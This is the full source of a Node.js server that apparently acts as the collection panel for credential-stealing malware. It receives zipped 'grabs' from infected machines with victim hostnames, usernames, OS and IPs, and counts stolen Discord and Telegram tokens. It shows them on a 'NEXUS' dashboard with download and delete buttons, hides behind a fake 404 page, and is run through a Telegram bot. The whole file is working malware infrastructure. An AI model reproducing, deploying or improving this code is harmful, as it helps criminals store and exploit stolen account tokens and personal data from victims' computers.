const express = require("express");
const multer = require("multer");
const crypto = require("crypto");
const { Pool } = require("pg");
const AdmZip = require("adm-zip");
const https = require("https");

const app = express();
const PORT = process.env.PORT || 8080;
const API_KEY = process.env.API_KEY || "changeme";
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || "";

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL && !process.env.DATABASE_URL.includes("localhost")
    ? { rejectUnauthorized: false }
    : false,
});

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 500 * 1024 * 1024 } });

// Server state
let serverRunning = true;

function checkKey(req, res, next) {
  const key = req.query.key || req.headers["x-api-key"] || (req.headers.authorization || "").replace("Bearer ", "");
  if (key !== API_KEY) return res.status(401).send(page404());
  next();
}

async function sendTelegramMessage(chatId, text) {
  return new Promise((resolve) => {
    const postData = JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: "HTML",
    });

    const options = {
      hostname: "api.telegram.org",
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(postData),
      },
    };

    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => { data += chunk; });
      res.on("end", () => { resolve(JSON.parse(data)); });
    });

    req.on("error", (e) => {
      console.error("Telegram error:", e);
      resolve({ ok: false });
    });

    req.write(postData);
    req.end();
  });
}

// Telegram webhook
app.post("/webhook", express.json(), async (req, res) => {
  try {
    const { message } = req.body;
    if (!message || !message.text) return res.json({ ok: 1 });

    const chatId = message.chat.id;
    const text = message.text.trim().toLowerCase();
    const username = message.from.username || message.from.first_name || "Unknown";

    // Admin check
    if (chatId !== parseInt(ADMIN_CHAT_ID) && message.chat.id !== parseInt(ADMIN_CHAT_ID)) {
      await sendTelegramMessage(chatId, "❌ <b>Unauthorized</b>\nOnly admins can control the server.");
      return res.json({ ok: 1 });
    }

    // Commands
    if (text === "/status") {
      const uptime = process.uptime();
      const hours = Math.floor(uptime / 3600);
      const mins = Math.floor((uptime % 3600) / 60);
      const status = serverRunning ? "🟢 <b>RUNNING</b>" : "🔴 <b>STOPPED</b>";
      const msg = `${status}\n⏱️ Uptime: ${hours}h ${mins}m\n👤 Request by: @${username}`;
      await sendTelegramMessage(chatId, msg);
    }
    else if (text === "/stop" || text === "/shutdown") {
      serverRunning = false;
      await sendTelegramMessage(chatId, "🛑 <b>Server Stopped</b>\n⚠️ Website is now DOWN.\n👤 Stopped by: @" + username);
      console.log(`[TELEGRAM] Server stopped by @${username}`);
      setTimeout(() => process.exit(0), 1000);
    }
    else if (text === "/start" || text === "/resume") {
      serverRunning = true;
      await sendTelegramMessage(chatId, "✅ <b>Server Started</b>\n🟢 Website is now LIVE.\n👤 Started by: @" + username);
      console.log(`[TELEGRAM] Server started by @${username}`);
    }
    else if (text === "/restart") {
      await sendTelegramMessage(chatId, "🔄 <b>Restarting Server...</b>\n⏳ This will take ~10 seconds.\n👤 Restarted by: @" + username);
      console.log(`[TELEGRAM] Server restart requested by @${username}`);
      setTimeout(() => process.exit(0), 1500);
    }
    else if (text === "/help" || text === "/commands") {
      const help = `<b>🤖 Server Control Commands</b>\n\n` +
        `/status - Check server status\n` +
        `/start - Bring server online\n` +
        `/stop - Take server offline\n` +
        `/restart - Restart the server\n` +
        `/help - Show this message`;
      await sendTelegramMessage(chatId, help);
    }
    else {
      await sendTelegramMessage(chatId, "❓ Unknown command. Type /help for available commands.");
    }

    res.json({ ok: 1 });
  } catch (error) {
    console.error("Webhook error:", error);
    res.json({ ok: 0 });
  }
});

async function initDb() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS grabs (
      id TEXT PRIMARY KEY,
      filename TEXT NOT NULL,
      filedata BYTEA NOT NULL,
      filesize BIGINT NOT NULL,
      ip TEXT DEFAULT '',
      machine TEXT DEFAULT '',
      username TEXT DEFAULT '',
      os TEXT DEFAULT '',
      arch TEXT DEFAULT '',
      created_at TIMESTAMPTZ DEFAULT NOW()
    )
  `);
  await pool.query(`ALTER TABLE grabs ADD COLUMN IF NOT EXISTS token_count INT DEFAULT 0`);
  await pool.query(`ALTER TABLE grabs ADD COLUMN IF NOT EXISTS src TEXT DEFAULT 'dc'`);
  await pool.query(`
    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      val TEXT DEFAULT '',
      bin BYTEA
    )
  `);
  await pool.query(`
    CREATE TABLE IF NOT EXISTS sessions (
      id TEXT PRIMARY KEY,
      machine TEXT DEFAULT '',
      username TEXT DEFAULT '',
      ip TEXT DEFAULT '',
      status TEXT DEFAULT 'connected',
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW()
    )
  `);
}

function parseZipMeta(buf) {
  try {
    const zip = new AdmZip(buf);
    let tokenCount = 0, src = "dc";
    for (const e of zip.getEntries()) {
      if (e.entryName === "m.json") {
        try { src = JSON.parse(e.getData().toString("utf8")).src || "dc"; } catch {}
      }
      if (e.entryName.endsWith("/tokens.json")) {
        try { const a = JSON.parse(e.getData().toString("utf8")); if (Array.isArray(a)) tokenCount += a.length; } catch {}
      }
    }
    return { tokenCount, src };
  } catch { return { tokenCount: 0, src: "dc" }; }
}

initDb().catch(e => console.error("[!] db init failed:", e.message));

app.get("/bg", async (req, res) => {
  try {
    const { rows } = await pool.query(`SELECT val, bin FROM settings WHERE key='background_image'`);
    if (!rows.length || !rows[0].bin) return res.status(404).end();
    res.setHeader("Content-Type", rows[0].val || "image/jpeg");
    res.setHeader("Cache-Control", "public, max-age=3600");
    res.send(rows[0].bin);
  } catch { res.status(500).end(); }
});

app.post("/theme", checkKey, upload.single("img"), async (req, res) => {
  try {
    if (req.file) {
      await pool.query(
        `INSERT INTO settings (key,val,bin) VALUES ('background_image',$1,$2)
         ON CONFLICT (key) DO UPDATE SET val=$1,bin=$2`,
        [req.file.mimetype, req.file.buffer]
      );
    }
    if (req.body && req.body.colors) {
      await pool.query(
        `INSERT INTO settings (key,val) VALUES ('theme_colors',$1)
         ON CONFLICT (key) DO UPDATE SET val=$1`,
        [req.body.colors]
      );
    }
    res.json({ ok: 1 });
  } catch (err) { res.status(500).json({ e: err.message }); }
});

app.post("/ping", checkKey, async (req, res) => {
  try {
    const sid = req.query.sid || crypto.randomBytes(4).toString("hex");
    const ip  = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    const status = (req.query.status || "connected").slice(0, 20);
    await pool.query(`
      INSERT INTO sessions (id, machine, username, ip, status, created_at, updated_at)
      VALUES ($1,$2,$3,$4,$5,NOW(),NOW())
      ON CONFLICT (id) DO UPDATE SET status=$5, updated_at=NOW()
    `, [sid, req.query.m||"", req.query.u||"", ip, status]);
    res.json({ ok:1, sid });
  } catch(err) { res.status(500).json({ e: err.message }); }
});

app.post("/theme/reset", checkKey, async (req, res) => {
  try {
    await pool.query(`DELETE FROM settings WHERE key IN ('background_image','theme_colors')`);
    res.json({ ok: 1 });
  } catch (err) { res.status(500).json({ e: err.message }); }
});

function fmtSize(bytes) {
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + " KB";
  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + " MB";
  return (bytes / 1073741824).toFixed(2) + " GB";
}

function timeAgo(dt) {
  const ms = Date.now() - new Date(dt).getTime();
  const s = Math.floor(ms / 1000);
  if (s < 60) return s + "s ago";
  const m = Math.floor(s / 60);
  if (m < 60) return m + "m ago";
  const h = Math.floor(m / 60);
  if (h < 24) return h + "h ago";
  const d = Math.floor(h / 24);
  return d + "d ago";
}

const fmtTime = dt => new Date(dt).toISOString().replace("T", " ").slice(0, 19);

function esc(s) {
  if (!s) return "";
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

function osIcon(os) {
  if (!os) return "?";
  const l = os.toLowerCase();
  if (l.includes("windows 10")) return "W10";
  if (l.includes("windows 11")) return "W11";
  if (l.includes("windows")) return "WIN";
  if (l.includes("linux")) return "LNX";
  if (l.includes("mac") || l.includes("darwin")) return "MAC";
  return "SYS";
}

function page404() {
  return `<!DOCTYPE html><html><head><title>404</title></head><body style="background:#000;color:#333;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace"><h1>404</h1></body></html>`;
}

app.post("/api/v1/sync", checkKey, upload.single("file"), async (req, res) => {
  if (!serverRunning) return res.status(503).json({ e: 3, msg: "Server is offline" });
  if (!req.file) return res.status(400).json({ e: 1 });
  try {
    const id = crypto.randomBytes(4).toString("hex");
    const ts = Date.now();
    const filename = `${ts}_${crypto.randomBytes(6).toString("hex")}.dat`;
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    const { tokenCount, src } = parseZipMeta(req.file.buffer);
    await pool.query(
      `INSERT INTO grabs (id, filename, filedata, filesize, ip, machine, username, os, arch, token_count, src)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)`,
      [id, filename, req.file.buffer, req.file.size,
       ip, req.query.m || "", req.query.u || "", req.query.o || "", req.query.a || "",
       tokenCount, src]
    );
    res.json({ e: 0, tc: tokenCount });
  } catch (err) {
    console.error("[!] upload error:", err.message);
    res.status(500).json({ e: 2 });
  }
});

app.get("/", checkKey, async (req, res) => {
  if (!serverRunning) return res.status(503).send("<h1>Server Offline</h1>");
  try {
    const [grabsRes, settingsRes, sessRes] = await Promise.all([
      pool.query(`SELECT id, filename, filesize, ip, machine, username, os, arch, created_at, COALESCE(token_count,0) as token_count, COALESCE(src,'dc') as src FROM grabs ORDER BY created_at DESC`),
      pool.query(`SELECT key, val, (bin IS NOT NULL AND length(bin)>0) as has_bin FROM settings`),
      pool.query(`SELECT id, machine, username, ip, status, updated_at FROM sessions WHERE updated_at > NOW() - INTERVAL '24 hours' ORDER BY updated_at DESC LIMIT 30`)
    ]);
    const rows = grabsRes.rows;
    const totalSize = rows.reduce((s, r) => s + parseInt(r.filesize || 0), 0);
    const k = encodeURIComponent(req.query.key);
    const entries = rows.map(r => ({
      id: r.id, f: r.filename, s: parseInt(r.filesize),
      t: r.created_at, ip: r.ip, m: r.machine,
      u: r.username, o: r.os, a: r.arch,
      tc: parseInt(r.token_count || 0), src: r.src || "dc",
    }));
    const smap = {};
    settingsRes.rows.forEach(r => { smap[r.key] = r; });
    const hasBg = !!(smap.background_image && smap.background_image.has_bin);
    let theme = null;
    if (smap.theme_colors && smap.theme_colors.val) {
      try { theme = JSON.parse(smap.theme_colors.val); } catch {}
    }
    const sessions = sessRes.rows;
    res.send(renderPage(entries, totalSize, k, { hasBg, theme, sessions }));
  } catch (err) {
    console.error("[!] dashboard error:", err.message);
    res.status(500).send("db error");
  }
});

app.get("/dl/:id", checkKey, async (req, res) => {
  try {
    const { rows } = await pool.query(
      `SELECT filename, filedata FROM grabs WHERE id = $1`, [req.params.id]
    );
    if (!rows.length) return res.status(404).send(page404());
    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename=${rows[0].filename}`);
    res.send(rows[0].filedata);
  } catch (err) {
    res.status(500).send("error");
  }
});

app.post("/rm/:id", checkKey, async (req, res) => {
  try { await pool.query(`DELETE FROM grabs WHERE id = $1`, [req.params.id]); } catch {}
  res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
});

function renderPage(entries, totalSize, k, { hasBg = false, theme = null, sessions = [] } = {}) {
  const uniqueIps = new Set(entries.map(e => e.ip)).size;
  const now = Date.now();
  const isFresh = (t) => (now - new Date(t).getTime()) < 5 * 60 * 1000;
  const tableRows = entries.map((e, i) => {
    const osTag = osIcon(e.o);
    const isWin = (e.o || "").toLowerCase().includes("windows");
    const fresh = isFresh(e.t);
    const hasTok = e.tc > 0;
    const srcTag = e.src === "tg" ? "TG" : "DC";
    const srcCls = e.src === "tg" ? "tag-b" : "tag-g";
    return `<tr class="${fresh ? "fresh " : ""}row-${Math.min(i,15)}">
      <td class="mono muted ind">${esc(e.id)}</td>
      <td><span class="tag ${srcCls}">${srcTag}</span>&nbsp;<span class="tag ${isWin ? "tag-g" : "tag-b"}">${osTag}</span></td>
      <td class="mono">${esc(e.m)}${e.u ? `<span class='muted'>&nbsp;\\&nbsp;${esc(e.u)}</span>` : ""}</td>
      <td class="mono muted">${esc(e.a)}</td>
      <td class="mono muted">${esc(e.ip)}</td>
      <td class="mono">${fmtSize(e.s || 0)}</td>
      <td class="mono ${hasTok ? "tok-yes" : "tok-no"}">${hasTok ? `<span class="tok-badge">&#9670; ${e.tc}</span>` : '<span class="muted">—</span>'}</td>
      <td><div class="ts">${fmtTime(e.t)}</div><div class="accent">${timeAgo(e.t)}</div></td>
      <td class="actions">
        <a class="btn btn-t" href="/dc/${esc(e.id)}?key=${k}" title="tokens">&#9670;</a>
        <a class="btn btn-p" href="/dl/${esc(e.id)}?key=${k}" title="download">&#8615;</a>
        <form method="POST" action="/rm/${esc(e.id)}?key=${k}" style="display:inline" onsubmit="return confirm('remove?')">
          <button class="btn btn-d" type="submit">&#10005;</button>
        </form>
      </td>
    </tr>`;
  }).join("");

  const themeOverride = theme
    ? `<style>:root{--accent:${esc(theme.accent)};--accent-dim:${esc(theme.accent)}26;--glow:${esc(theme.glow)}}</style>`
    : '';
  const bgTs = Date.now();

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NEXUS</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{
  --void:#03030A;
  --glass:rgba(10,8,24,0.62);
  --glass-b:rgba(255,255,255,0.09);
  --text:#CCC8E8;
  --muted:#504E6A;
  --accent:#B06EFF;
  --accent-dim:#B06EFF22;
  --glow:#7C3AED;
  --green:#4ADE80;
  --red:#F87171;
  --blue:#60A5FA;
  --sans:'Space Grotesk',system-ui,sans-serif;
  --mono:'JetBrains Mono','Cascadia Code','Fira Code',monospace
}
*{margin:0;padding:0;box-sizing:border-box}
body{
  background-color:var(--void);
  ${hasBg ? `background-image:url('/bg?t=${bgTs}');background-size:cover;background-attachment:fixed;background-position:center;` : ''}
  color:var(--text);font-family:var(--sans);font-size:14px;
  min-height:100vh;-webkit-font-smoothing:antialiased;overflow-x:hidden
}
</style>
</head>
<body>
<h2>NEXUS Dashboard</h2>
<p>Total Files: ${entries.length} | Total Size: ${fmtSize(totalSize)} | Unique IPs: ${uniqueIps}</p>
<p style="color:var(--green)">🟢 Server Status: ONLINE</p>
<table border="1" style="width:100%;margin-top:20px;">
<thead><tr><th>ID</th><th>Type</th><th>Machine</th><th>Arch</th><th>IP</th><th>Size</th><th>Tokens</th><th>Time</th></tr></thead>
<tbody>${tableRows}</tbody>
</table>
</body>
</html>`;
}

const server = app.listen(PORT, () => {
  console.log(`[✓] Server running on port ${PORT}`);
  if (TELEGRAM_BOT_TOKEN && ADMIN_CHAT_ID) {
    console.log(`[✓] Telegram bot commands enabled`);
  }
});

module.exports = app;

